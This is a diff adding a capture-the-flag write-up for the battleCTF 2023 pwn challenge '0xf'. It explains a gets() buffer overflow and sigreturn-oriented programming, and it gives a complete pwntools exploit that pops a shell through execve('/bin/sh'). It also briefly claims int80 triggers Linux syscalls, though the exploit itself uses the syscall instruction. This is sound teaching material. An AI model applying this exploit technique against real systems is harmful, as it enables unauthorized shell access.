@@ -1356,3 +1356,140 @@ Flag: battleCTF{N3w_1nteg3r_0v3rfl0w_bb4a0612f6b3ad0d04223e022687600c}
 
 After downloading the file attached and unzipping it I got the binary but no source code
 
+Let us check the file type and the protections enabled on it
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d6d444cc-68af-4bc1-bdb2-3a968fc63990)
+
+We are working with a x64 binary which is dynamically linked, not stripped and the only protections enabled on it is NX
+
+I decompiled it using ghidra and here's the main function
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f3cb06fd-a94b-4545-85b5-34df152a388a)
+
+```c
+
+int main(void)
+
+{
+  char buf [48];
+  
+  puts("Africa battle CTF 2023");
+  puts("Tell us about your ethnicity:");
+  gets(buf);
+  return 0;
+}
+```
+
+We see there's a buffer overflow cause gets() is used and there's also another function called hausa
+
+Here's it decompiled code
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/820dbaf7-42c6-494d-9d2d-f9443f18ca59)
+
+```c
+
+undefined8 hausa(void)
+
+{
+  return 0xf;
+}
+```
+
+It returns 0xf which is an essential assembly value needed for performing Sigreturn Oriented Programming (SROP) 
+
+In the hood it does
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/93665173-11ab-4e10-9ee6-ec857a414106)
+
+Which is basically:
+-  mov eax, 0xf; ret;
+
+Since our exploitation technique will be SROP I need to search if there's /bin/sh in the binary
+
+And luckily there was
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0bcf0c75-64ba-4323-a421-f9d2f27b6234)
+
+How will I take advantage of this?
+
+First we need to know what syscall is 
+- A syscall is a system call, and is how the program enters the kernel in order to carry out specific tasks such as creating processes, I/O and any others they would require kernel-level access.
+
+And how do we trigger a syscall
+- On Linux, a syscall is triggered by the int80 instruction. Once it's called, the kernel checks the value stored in RAX - this is the syscall number, which defines what syscall gets run. As per the table, the other parameters can be stored in RDI, RSI, RDX, etc and every parameter has a different meaning for the different syscalls.
+
+A notable syscall is the execve syscall, which executes the program passed to it in RDI. RSI and RDX hold arvp and envp respectively.
+
+This means, if there is no system() function, we can use execve to call /bin/sh instead - all we have to do is pass in a pointer to /bin/sh to RDI, and populate RSI and RDX with 0 (this is because both argv and envp need to be NULL to pop a shell).
+
+And luckily pwntool can allow us interact with sigreturn 
+
+Here's my exploit [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/battlectf23/prequal/pwn/0xf/solve.py)
+
+```python
+#!/usr/bin/python
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './0xf'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 56
+
+rax_0xf = 0x000000000040113a # mov eax, 0xf; ret;
+syscall = 0x0000000000401140 # syscall; ret; 
+
+frame = SigreturnFrame()
+frame.rax = 0x3b            # syscall number for execve
+frame.rdi = 0x402004        # pointer to /bin/sh
+frame.rsi = 0x0             # NULL
+frame.rdx = 0x0             # NULL
+frame.rip = syscall
+
+# Build the payload
+payload = flat({
+    offset: [
+        rax_0xf,
+        syscall,
+        frame
+    ]
+})
+
+io.sendline(payload)
+
+# Got Shell?
+io.interactive()
+```
+
+Running it gives me shell locally
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f10a8a4c-4203-467d-a7ec-a468aeb8d1f4)
+
+It also works remotely
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/00a3ad22-393d-447c-93cb-24cb494b5e59)
+
+```
+Flag: battleCTF{Ethnicity_SigROP_Syscall_Army_f0d9e29e9c1d03c996083bb9c3325d33}
+```
+
